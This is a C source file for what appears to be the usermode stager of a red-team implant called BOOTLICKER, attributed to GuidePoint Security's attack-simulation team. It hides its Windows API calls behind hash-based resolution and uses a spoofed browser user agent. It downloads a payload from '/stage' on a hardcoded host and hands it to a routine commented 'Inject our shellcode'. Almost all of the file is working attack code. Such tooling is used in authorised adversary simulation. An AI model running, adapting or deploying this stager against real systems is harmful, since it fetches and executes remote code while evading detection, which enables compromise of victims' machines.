/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( InternetQueryDataAvailable );
	D_API( RtlInitUnicodeString );
	D_API( InternetCloseHandle );
	D_API( HttpSendRequestA );
	D_API( HttpOpenRequestA );
	D_API( InternetConnectA );
	D_API( InternetReadFile );
	D_API( HttpEndRequestA );
	D_API( HttpQueryInfoA );
	D_API( InternetOpenA );
	D_API( LdrUnloadDll );
	D_API( LdrLoadDll );
} API ;

/* API Hashes */
#define H_API_INTERNETQUERYDATAAVAILABLE	0x48114d7f /* InternetQueryDataAvailable */
#define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
#define H_API_INTERNETCLOSEHANDLE		0x87a314f0 /* InternetCloseHandle */
#define H_API_HTTPSENDREQUESTA			0x2bc23839 /* HttpSendRequestA */
#define H_API_HTTPOPENREQUESTA			0x8b6ddc61 /* HttpOpenRequestA */
#define H_API_INTERNETCONNECTA			0xc058d7b9 /* InternetConnectA */
#define H_API_INTERNETREADFILE			0x7766910a /* InternetReadFile */
#define H_API_HTTPENDREQUESTA			0x9b722d26 /* HttpEndRequestA */
#define H_API_HTTPQUERYINFOA			0x9df7f348 /* HttpQueryInfoA */
#define H_API_INTERNETOPENA			0xa7917761 /* InternetOpenA */
#define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
#define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */

/* LIB Hashes */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Does absolute nothing. Write your usermode code here.
 *
!*/
D_SEC( F ) VOID NTAPI UsermodeMain( _In_ PVOID SystemArgument1, _In_ PVOID SystemArgument2, _In_ PVOID SystemArgument3 )
{
	API		Api;
	UNICODE_STRING	Uni;

	DWORD		Ofs = 0;
	DWORD		Idx = 0;
	DWORD		Red = 0;
	DWORD		Len = 0;
	BOOLEAN		bRd = FALSE;

	PVOID		Lib = NULL;
	PVOID		Mem = NULL;
	PVOID		Tmp = NULL;
	HINTERNET	Ioh = NULL;
	HINTERNET	Ich = NULL;
	HINTERNET	Hor = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Api.RtlInitUnicodeString = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.LdrUnloadDll         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.LdrLoadDll           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	/* Load the target DLL */
	Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"wininet.dll" ) ) );

	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Lib ) ) ) {
		Api.InternetQueryDataAvailable = PeGetFuncEat( Lib, H_API_INTERNETQUERYDATAAVAILABLE );
		Api.InternetCloseHandle        = PeGetFuncEat( Lib, H_API_INTERNETCLOSEHANDLE );
		Api.HttpSendRequestA           = PeGetFuncEat( Lib, H_API_HTTPSENDREQUESTA );
		Api.HttpOpenRequestA           = PeGetFuncEat( Lib, H_API_HTTPOPENREQUESTA );
		Api.InternetConnectA           = PeGetFuncEat( Lib, H_API_INTERNETCONNECTA );
		Api.InternetReadFile           = PeGetFuncEat( Lib, H_API_INTERNETREADFILE );
		Api.HttpEndRequestA            = PeGetFuncEat( Lib, H_API_HTTPENDREQUESTA );
		Api.HttpQueryInfoA             = PeGetFuncEat( Lib, H_API_HTTPQUERYINFOA );
		Api.InternetOpenA              = PeGetFuncEat( Lib, H_API_INTERNETOPENA );

		/* 'Configure' your HTTP request */
		Ioh = Api.InternetOpenA( C_PTR( G_PTR( "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" ) ),
				         INTERNET_OPEN_TYPE_DIRECT,
					 NULL,
					 NULL,
					 0 );

		if ( Ioh != NULL ) {

			/* 'Connect' to the target host */
			Ich = Api.InternetConnectA( Ioh, 
					            C_PTR( G_PTR( "192.168.66.11" ) ), 
						    INTERNET_DEFAULT_HTTP_PORT, 
						    NULL, 
						    NULL, 
						    INTERNET_SERVICE_HTTP,
						    0,
						    NULL );

			if ( Ich != NULL ) {

				/* 'Open' a request */
				Hor = Api.HttpOpenRequestA( Ich, 
						            C_PTR( G_PTR( "GET" ) ), 
							    C_PTR( G_PTR( "/stage" ) ), 
							    NULL, 
							    NULL, 
							    NULL,
							    INTERNET_FLAG_NO_AUTO_REDIRECT |
							    INTERNET_FLAG_NO_CACHE_WRITE |
							    INTERNET_FLAG_NO_COOKIES |
							    INTERNET_FLAG_PRAGMA_NOCACHE |
							    INTERNET_FLAG_RELOAD |
							    INTERNET_FLAG_NO_UI,
							    NULL );

				if ( Hor != NULL ) {
					/* Send the data */
					if ( Api.HttpSendRequestA( Hor, NULL, 0, NULL, 0 ) ) {
						/* Query the content length of the payload */
						if ( Api.HttpQueryInfoA( Hor, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &Len, &( DWORD ){ sizeof( DWORD ) }, &Idx ) ) {
							/* allocate the full block of memory */
							if ( ( Mem = MemAlloc( Len ) ) != NULL ) {
								while( TRUE ){
									/* Query the available data as of late */
									if ( ! Api.InternetQueryDataAvailable( Hor, &Red, 0, 0 ) ) {
										break;
									};
									/* Read the incoming file */
									if ( ! Api.InternetReadFile( Hor, C_PTR( U_PTR( Mem ) + Ofs ), Red, &Red ) ) {
										break;
									};
									if ( Red == 0 ) {
										break;
									}
									/* Add to the offset that we have read */
									Ofs = Ofs + Red;
								}
								/* Is this the expected length */
								if ( Ofs == Len ) {
									/* Inject our shellcode */
									Inject( Mem, Len );
								}
								/* Free the memory */
								MemFree( Mem );
							};
						};
					};
					/* Close the opened handle */
					Api.InternetCloseHandle( Hor );
				};
				/* Close the opened handle */
				Api.InternetCloseHandle( Ich );
			};

			/* Close the opened handle */
			Api.InternetCloseHandle( Ioh );
		};

		Api.LdrUnloadDll( Lib );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};
